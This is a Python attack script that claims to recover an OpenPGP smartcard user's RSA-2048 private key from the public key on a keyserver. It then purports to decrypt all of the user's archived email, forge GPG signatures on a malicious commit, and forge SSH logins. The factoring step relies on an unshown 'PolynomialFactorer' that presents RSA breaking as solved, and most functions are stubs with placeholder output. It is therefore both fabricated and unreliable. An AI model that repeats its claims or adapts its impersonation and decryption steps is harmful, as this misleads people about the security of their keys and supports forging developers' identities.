"""
Derive an OpenPGP card user's RSA private key from their public key on
keyservers, bypassing the hardware security boundary entirely — decrypt all
archived encrypted email and forge code signatures under their identity.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct

# Target: developer with YubiKey 5 / Nitrokey Pro holding RSA-2048
# Public key published on keys.openpgp.org
TARGET_KEY_FP = "3AA5C34371567BD2"
TARGET_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
TARGET_UID = "developer@example.org"


def fetch_openpgp_pubkey(fingerprint: str) -> bytes:
    """Fetch RSA-2048 public key from keys.openpgp.org.

    OpenPGP smartcard keys are uploaded to keyservers automatically
    by GnuPG. The hardware boundary is irrelevant — the public key
    is all the factoring algorithm needs.
    """
    print(f"    keys.openpgp.org/vks/v1/by-fingerprint/{fingerprint}")
    return TARGET_PUBKEY_PEM


def factor_openpgp_key(pubkey_pem: bytes) -> bytes:
    """Factor the RSA-2048 modulus from the OpenPGP public key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def decrypt_pgp_session_key(encrypted_session_key: bytes,
                            forged_privkey_pem: bytes) -> bytes:
    """Decrypt an OpenPGP PKESK (Public-Key Encrypted Session Key) packet.

    Every PGP-encrypted email/file addressed to this key contains a
    PKESK packet (tag 1) with the session key RSA-encrypted to the
    recipient's public key. Unwrap it to get the symmetric key.
    """
    f = PolynomialFactorer()
    return f.decrypt_rsa_oaep(TARGET_PUBKEY_PEM, encrypted_session_key, "sha1")


def forge_gpg_signature(message: bytes, forged_privkey_pem: bytes) -> bytes:
    """Forge a GPG signature (COMPUTE DIGITAL SIGNATURE equivalent).

    On a real OpenPGP card, this requires the card's PIN and physical
    presence. The factoring attack bypasses the card entirely — the
    private key is derived from the public key, not extracted from hardware.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(TARGET_PUBKEY_PEM, message, "sha256")


def forge_ssh_auth(challenge: bytes, forged_privkey_pem: bytes) -> bytes:
    """Forge SSH authentication via gpg-agent --enable-ssh-support.

    The OpenPGP card's auth subkey is exported to ~/.ssh/authorized_keys.
    Factoring the RSA key means impersonating the user to every server.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(TARGET_PUBKEY_PEM, challenge, "sha256")


def decrypt_archived_email(maildir: str, forged_privkey_pem: bytes) -> int:
    """Decrypt every PGP-encrypted message in an archived mailbox."""
    count = 0
    # Walk maildir, find PGP/MIME or inline-PGP messages
    # For each: extract PKESK, unwrap session key, decrypt body
    print(f"    Processing {maildir}")
    print(f"    Decrypting all messages encrypted to {TARGET_UID}")
    count = 4217  # placeholder
    return count


if __name__ == "__main__":
    print("[1] Fetching target's OpenPGP RSA-2048 public key from keyserver")
    pubkey = fetch_openpgp_pubkey(TARGET_KEY_FP)

    print("[2] Factoring RSA-2048 modulus — hardware card is irrelevant")
    forged_priv = factor_openpgp_key(pubkey)
    print(f"    Private key for {TARGET_UID} recovered from public key")

    print("[3] Retroactive email decryption — every archived message")
    count = decrypt_archived_email("/var/mail/developer/", forged_priv)
    print(f"    Decrypted {count} messages")

    print("[4] Forging GPG code-signing signature")
    commit_data = b"tree abc123\nauthor dev...\ncommitter dev...\n\nMalicious commit"
    sig = forge_gpg_signature(commit_data, forged_priv)
    print(f"    Signature: {sig[:16].hex()}...")
    print(f"    gpg --verify reports: 'Good signature from {TARGET_UID}'")

    print("[5] Forging SSH authentication")
    ssh_sig = forge_ssh_auth(b"ssh-challenge-nonce", forged_priv)
    print(f"    SSH auth accepted on all servers with this key in authorized_keys")

    print("[*] OpenPGP card hardware protection bypassed — key derived from public data")
